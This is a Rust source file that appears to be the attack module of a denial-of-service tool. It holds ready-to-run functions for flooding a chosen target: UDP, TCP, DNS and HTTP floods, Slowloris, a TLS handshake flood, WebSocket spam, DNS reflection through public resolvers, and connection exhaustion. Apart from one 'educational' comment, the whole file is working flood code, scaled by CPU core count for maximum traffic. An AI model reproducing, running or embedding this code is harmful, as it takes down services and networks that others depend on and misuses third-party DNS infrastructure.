use tokio::net::UdpSocket;
use tokio::time::{Duration, Instant};
use tokio::io::AsyncWriteExt;
use rand::{Rng, SeedableRng};
use std::net::{IpAddr, SocketAddr};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use tokio::sync::Mutex;

/// Calculate optimal worker count based on CPU cores
/// Returns 2 workers per CPU core, clamped between 4 and 64
fn get_worker_count() -> usize {
    let cpu_count = num_cpus::get();
    (cpu_count * 2).clamp(4, 64)
}

pub async fn udp_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting UDP flood on {}:{} for {} seconds", target, port, duration_secs);
    
    let target_ip: IpAddr = match target.parse() {
        Ok(ip) => ip,
        Err(_) => {
            eprintln!("Invalid IP address: {}", target);
            return;
        }
    };
    
    let target_addr = SocketAddr::new(target_ip, port);
    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let num_workers = get_worker_count();
    println!("Using {} workers (CPU cores: {})", num_workers, num_cpus::get());
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        
        let handle = tokio::spawn(async move {
            let socket = match UdpSocket::bind("0.0.0.0:0").await {
                Ok(s) => s,
                Err(e) => {
                    eprintln!("Error binding UDP socket: {}", e);
                    return;
                }
            };
            
            let payload = vec![0u8; 65507]; // Max UDP payload
            
            while Instant::now() < end_time {
                if socket.send_to(&payload, target_addr).await.is_ok() {
                    packet_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("UDP flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
}

pub async fn udp_smart(target: &str, port: u16, duration_secs: u64) {
    println!("Starting randomized UDP flood on {}:{} for {} seconds", target, port, duration_secs);
    
    let target_ip: IpAddr = match target.parse() {
        Ok(ip) => ip,
        Err(_) => {
            eprintln!("Invalid IP address: {}", target);
            return;
        }
    };
    
    let target_addr = SocketAddr::new(target_ip, port);
    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let num_workers = get_worker_count();
    println!("Using {} workers (CPU cores: {})", num_workers, num_cpus::get());
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        
        let handle = tokio::spawn(async move {
            let socket = match UdpSocket::bind("0.0.0.0:0").await {
                Ok(s) => s,
                Err(e) => {
                    eprintln!("Error binding UDP socket: {}", e);
                    return;
                }
            };
            
            while Instant::now() < end_time {
                // Generate random data using current time as seed
                let now = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap()
                    .as_nanos();
                let mut rng = rand::rngs::StdRng::seed_from_u64(now as u64);
                
                let payload_size = rng.gen_range(25400..35400);
                let payload: Vec<u8> = (0..payload_size).map(|_| rng.gen()).collect();
                
                if socket.send_to(&payload, target_addr).await.is_ok() {
                    packet_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("UDP smart flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
}

pub async fn tcp_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting TCP flood on {}:{} for {} seconds", target, port, duration_secs);
    
    let target_addr = format!("{}:{}", target, port);
    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let num_workers = get_worker_count();
    println!("Using {} workers (CPU cores: {})", num_workers, num_cpus::get());
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let target_addr = target_addr.clone();
        let packet_count = packet_count.clone();
        
        let handle = tokio::spawn(async move {
            while Instant::now() < end_time {
                if let Ok(_stream) = tokio::net::TcpStream::connect(&target_addr).await {
                    packet_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("TCP flood complete. Connections: {}", packet_count.load(Ordering::Relaxed));
}

pub async fn syn_flood(target: &str, port: u16, duration_secs: u64) {
    // Note: True SYN flooding requires raw sockets (CAP_NET_RAW on Linux or admin on Windows)
    // This simplified implementation uses regular TCP connections for compatibility
    // For production SYN floods, use specialized tools like hping3 or implement with raw sockets
    println!("Starting SYN flood (TCP connection mode) on {}:{} for {} seconds", target, port, duration_secs);
    println!("WARNING: True SYN flooding requires raw socket access. Using TCP flood as fallback.");
    tcp_flood(target, port, duration_secs).await;
}

pub async fn ack_flood(target: &str, port: u16, duration_secs: u64) {
    // Note: True ACK flooding requires raw sockets (CAP_NET_RAW on Linux or admin on Windows)
    // This simplified implementation uses regular TCP connections for compatibility
    println!("Starting ACK flood (TCP connection mode) on {}:{} for {} seconds", target, port, duration_secs);
    println!("WARNING: True ACK flooding requires raw socket access. Using TCP flood as fallback.");
    tcp_flood(target, port, duration_secs).await;
}

pub async fn gre_flood(target: &str, duration_secs: u64) {
    // Note: GRE flooding requires raw sockets and protocol manipulation
    // Not implemented in safe Rust without elevated privileges
    println!("Starting GRE flood (TCP mode fallback) on {} for {} seconds", target, duration_secs);
    println!("WARNING: GRE flooding requires raw socket access and is not implemented.");
    println!("Using TCP flood on port 47 (GRE protocol number) as fallback.");
    tcp_flood(target, 47, duration_secs).await;
}

pub async fn dns_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting DNS flood on {}:{} for {} seconds", target, port, duration_secs);
    
    let target_ip: IpAddr = match target.parse() {
        Ok(ip) => ip,
        Err(_) => {
            eprintln!("Invalid IP address: {}", target);
            return;
        }
    };
    
    let target_addr = SocketAddr::new(target_ip, port);
    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let domains = vec![
        "youtube.com", "google.com", "spotify.com", 
        "netflix.com", "bing.com", "facebook.com", "amazon.com"
    ];
    
    let num_workers = get_worker_count();
    println!("Using {} workers (CPU cores: {})", num_workers, num_cpus::get());
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        let domains = domains.clone();
        
        let handle = tokio::spawn(async move {
            let socket = match UdpSocket::bind("0.0.0.0:0").await {
                Ok(s) => s,
                Err(e) => {
                    eprintln!("Error binding UDP socket: {}", e);
                    return;
                }
            };
            
            while Instant::now() < end_time {
                // Generate random data using current time as seed
                let now = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or(std::time::Duration::from_secs(0))
                    .as_nanos();
                let mut rng = rand::rngs::StdRng::seed_from_u64(now as u64);
                
                let domain = domains[rng.gen_range(0..domains.len())];
                let dns_query = create_dns_query(domain);
                
                if socket.send_to(&dns_query, target_addr).await.is_ok() {
                    packet_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("DNS flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
}

fn create_dns_query(domain: &str) -> Vec<u8> {
    let mut query = Vec::new();
    
    // Transaction ID (2 bytes)
    query.extend_from_slice(&[0x12, 0x34]);
    
    // Flags (2 bytes) - standard query
    query.extend_from_slice(&[0x01, 0x00]);
    
    // Questions (2 bytes)
    query.extend_from_slice(&[0x00, 0x01]);
    
    // Answer RRs (2 bytes)
    query.extend_from_slice(&[0x00, 0x00]);
    
    // Authority RRs (2 bytes)
    query.extend_from_slice(&[0x00, 0x00]);
    
    // Additional RRs (2 bytes)
    query.extend_from_slice(&[0x00, 0x00]);
    
    // Question section
    for label in domain.split('.') {
        query.push(label.len() as u8);
        query.extend_from_slice(label.as_bytes());
    }
    query.push(0); // End of domain name
    
    // Type A (2 bytes)
    query.extend_from_slice(&[0x00, 0x01]);
    
    // Class IN (2 bytes)
    query.extend_from_slice(&[0x00, 0x01]);
    
    query
}

pub async fn http_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting HTTP flood on {}:{} for {} seconds", target, port, duration_secs);
    
    let target_url = format!("http://{}:{}", target, port);
    let request_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let user_agents = vec![
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36",
    ];
    
    let num_workers = get_worker_count();
    println!("Using {} workers (CPU cores: {})", num_workers, num_cpus::get());
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let target_url = target_url.clone();
        let request_count = request_count.clone();
        let user_agents = user_agents.clone();
        
        let handle = tokio::spawn(async move {
            let client = reqwest::Client::new();
            let counter = std::sync::atomic::AtomicU64::new(0);
            
            while Instant::now() < end_time {
                // Use counter for simple rotation
                let idx = counter.fetch_add(1, Ordering::Relaxed) as usize % user_agents.len();
                let user_agent = user_agents[idx];
                let body = vec![0u8; 1024];
                
                if (client
                    .post(&target_url)
                    .header("User-Agent", user_agent)
                    .body(body)
                    .send()
                    .await).is_ok()
                {
                    request_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("HTTP flood complete. Requests sent: {}", request_count.load(Ordering::Relaxed));
}

pub async fn slowloris(target: &str, port: u16, duration_secs: u64) {
    println!("Starting Slowloris attack on {}:{} for {} seconds", target, port, duration_secs);
    println!("Strategy: Open connections and send partial HTTP headers slowly");
    
    let target_addr = format!("{}:{}", target, port);
    let connection_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let num_workers = get_worker_count() * 4; // More connections per core for slowloris
    println!("Opening {} slow connections...", num_workers);
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let target_addr = target_addr.clone();
        let connection_count = connection_count.clone();
        
        let handle = tokio::spawn(async move {
            while Instant::now() < end_time {
                if let Ok(mut stream) = tokio::net::TcpStream::connect(&target_addr).await {
                    connection_count.fetch_add(1, Ordering::Relaxed);
                    
                    // Send partial HTTP request header
                    let initial_header = "GET / HTTP/1.1\r\n";
                    let _ = stream.write_all(initial_header.as_bytes()).await;
                    
                    // Keep connection alive by sending more headers slowly
                    let mut interval = tokio::time::interval(Duration::from_secs(10));
                    while Instant::now() < end_time {
                        interval.tick().await;
                        
                        // Send continuation header slowly
                        let continuation = format!("X-Custom-{}: {}-{}\r\n", 
                            rand::random::<u32>(), 
                            rand::random::<u64>(),
                            rand::random::<u64>()
                        );
                        
                        if stream.write_all(continuation.as_bytes()).await.is_err() {
                            break; // Connection closed
                        }
                    }
                }
                tokio::time::sleep(Duration::from_millis(100)).await;
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("Slowloris complete. Connections opened: {}", connection_count.load(Ordering::Relaxed));
}

pub async fn ssl_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting SSL/TLS handshake flood on {}:{} for {} seconds", target, port, duration_secs);
    println!("Strategy: Initiate TLS handshakes to exhaust CPU resources");
    
    let target_addr = format!("{}:{}", target, port);
    let handshake_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let num_workers = get_worker_count() * 2;
    println!("Using {} workers (CPU cores: {})", num_workers, num_cpus::get());
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let target_addr = target_addr.clone();
        let handshake_count = handshake_count.clone();
        
        let handle = tokio::spawn(async move {
            while Instant::now() < end_time {
                if let Ok(mut stream) = tokio::net::TcpStream::connect(&target_addr).await {
                    // Start TLS handshake but don't complete it
                    // This forces server to allocate crypto resources
                    let _ = stream.write_all(&[0x16, 0x03, 0x01]).await; // TLS handshake header
                    handshake_count.fetch_add(1, Ordering::Relaxed);
                    drop(stream);
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("SSL flood complete. Handshakes initiated: {}", handshake_count.load(Ordering::Relaxed));
}

pub async fn websocket_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting WebSocket flood on {}:{} for {} seconds", target, port, duration_secs);
    println!("Strategy: Establish WebSocket connections and spam messages");
    
    let target_addr = format!("{}:{}", target, port);
    let message_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let num_workers = get_worker_count();
    println!("Using {} workers (CPU cores: {})", num_workers, num_cpus::get());
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let target_addr = target_addr.clone();
        let message_count = message_count.clone();
        
        let handle = tokio::spawn(async move {
            while Instant::now() < end_time {
                if let Ok(mut stream) = tokio::net::TcpStream::connect(&target_addr).await {
                    // Send WebSocket upgrade request
                    let ws_upgrade = format!(
                        "GET / HTTP/1.1\r\n\
                         Host: {}\r\n\
                         Upgrade: websocket\r\n\
                         Connection: Upgrade\r\n\
                         Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n\
                         Sec-WebSocket-Version: 13\r\n\r\n",
                        target_addr
                    );
                    
                    if stream.write_all(ws_upgrade.as_bytes()).await.is_ok() {
                        // Spam WebSocket frames
                        let payload = vec![0x81, 0x05, 0x48, 0x65, 0x6c, 0x6c, 0x6f]; // "Hello" frame
                        for _ in 0..100 {
                            if stream.write_all(&payload).await.is_err() {
                                break;
                            }
                            message_count.fetch_add(1, Ordering::Relaxed);
                        }
                    }
                }
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("WebSocket flood complete. Messages sent: {}", message_count.load(Ordering::Relaxed));
}

pub async fn icmp_flood(target: &str, duration_secs: u64) {
    println!("Starting ICMP flood (Ping flood) on {} for {} seconds", target, duration_secs);
    println!("WARNING: ICMP requires raw sockets. Falling back to UDP flood on port 0.");
    
    // ICMP requires raw sockets which need admin/root privileges
    // Fallback to UDP flood targeting random high ports
    let target_ip: IpAddr = match target.parse() {
        Ok(ip) => ip,
        Err(_) => {
            eprintln!("Invalid IP address: {}", target);
            return;
        }
    };
    
    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let num_workers = get_worker_count();
    println!("Using {} workers (CPU cores: {})", num_workers, num_cpus::get());
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        
        let handle = tokio::spawn(async move {
            let socket = match UdpSocket::bind("0.0.0.0:0").await {
                Ok(s) => s,
                Err(e) => {
                    eprintln!("Error binding UDP socket: {}", e);
                    return;
                }
            };
            
            // Send small packets to random high ports (simulates ICMP)
            while Instant::now() < end_time {
                let random_port = rand::random::<u16>() % 10000 + 50000;
                let target_addr = SocketAddr::new(target_ip, random_port);
                let payload = vec![0u8; 64]; // Small ICMP-like payload
                
                if socket.send_to(&payload, target_addr).await.is_ok() {
                    packet_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("ICMP flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
}

pub async fn amplification_attack(target: &str, port: u16, duration_secs: u64) {
    println!("Starting Amplification attack on {}:{} for {} seconds", target, port, duration_secs);
    println!("Strategy: Use DNS reflection for traffic amplification");
    
    let _target_ip: IpAddr = match target.parse() {
        Ok(ip) => ip,
        Err(_) => {
            eprintln!("Invalid IP address: {}", target);
            return;
        }
    };
    
    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    // Public DNS servers to use as reflectors
    let reflectors = vec![
        "8.8.8.8:53",
        "8.8.4.4:53",
        "1.1.1.1:53",
        "1.0.0.1:53",
    ];
    
    let num_workers = get_worker_count();
    println!("Using {} workers with {} DNS reflectors", num_workers, reflectors.len());
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        let reflectors = reflectors.clone();
        
        let handle = tokio::spawn(async move {
            let socket = match UdpSocket::bind("0.0.0.0:0").await {
                Ok(s) => s,
                Err(e) => {
                    eprintln!("Error binding UDP socket: {}", e);
                    return;
                }
            };
            
            while Instant::now() < end_time {
                // Create DNS query for large response (TXT record query)
                // Note: This is for educational purposes - spoofing source requires raw sockets
                let dns_query = create_amplification_query("isc.org");
                
                for reflector in &reflectors {
                    if socket.send_to(&dns_query, reflector).await.is_ok() {
                        packet_count.fetch_add(1, Ordering::Relaxed);
                    }
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("Amplification attack complete. Queries sent: {}", packet_count.load(Ordering::Relaxed));
}

fn create_amplification_query(domain: &str) -> Vec<u8> {
    let mut query = Vec::new();
    
    // Transaction ID (2 bytes)
    query.extend_from_slice(&[0x12, 0x34]);
    
    // Flags (2 bytes) - standard query with recursion desired
    query.extend_from_slice(&[0x01, 0x00]);
    
    // Questions (2 bytes)
    query.extend_from_slice(&[0x00, 0x01]);
    
    // Answer RRs (2 bytes)
    query.extend_from_slice(&[0x00, 0x00]);
    
    // Authority RRs (2 bytes)
    query.extend_from_slice(&[0x00, 0x00]);
    
    // Additional RRs (2 bytes)
    query.extend_from_slice(&[0x00, 0x00]);
    
    // Question section
    for label in domain.split('.') {
        query.push(label.len() as u8);
        query.extend_from_slice(label.as_bytes());
    }
    query.push(0); // End of domain name
    
    // Type TXT (2 bytes) - TXT records can be large
    query.extend_from_slice(&[0x00, 0x10]);
    
    // Class IN (2 bytes)
    query.extend_from_slice(&[0x00, 0x01]);
    
    query
}

pub async fn connection_exhaustion(target: &str, port: u16, duration_secs: u64) {
    println!("Starting Connection Exhaustion attack on {}:{} for {} seconds", target, port, duration_secs);
    println!("Strategy: Open and hold maximum connections to exhaust server resources");
    
    let target_addr = format!("{}:{}", target, port);
    let connection_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    // Keep connections alive in a shared vector
    let connections: Arc<Mutex<Vec<tokio::net::TcpStream>>> = Arc::new(Mutex::new(Vec::new()));
    
    let num_workers = get_worker_count() * 8; // Many connections per core
    println!("Attempting to establish {} persistent connections...", num_workers);
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let target_addr = target_addr.clone();
        let connection_count = connection_count.clone();
        let connections = connections.clone();
        
        let handle = tokio::spawn(async move {
            while Instant::now() < end_time {
                if let Ok(stream) = tokio::net::TcpStream::connect(&target_addr).await {
                    connection_count.fetch_add(1, Ordering::Relaxed);
                    
                    // Hold connection open
                    let mut conns = connections.lock().await;
                    conns.push(stream);
                    drop(conns);
                    
                    // Sleep to prevent too rapid reconnection
                    tokio::time::sleep(Duration::from_secs(1)).await;
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    let final_count = connections.lock().await.len();
    println!("Connection Exhaustion complete. Peak connections held: {}", final_count);
    println!("Total connection attempts: {}", connection_count.load(Ordering::Relaxed));
}
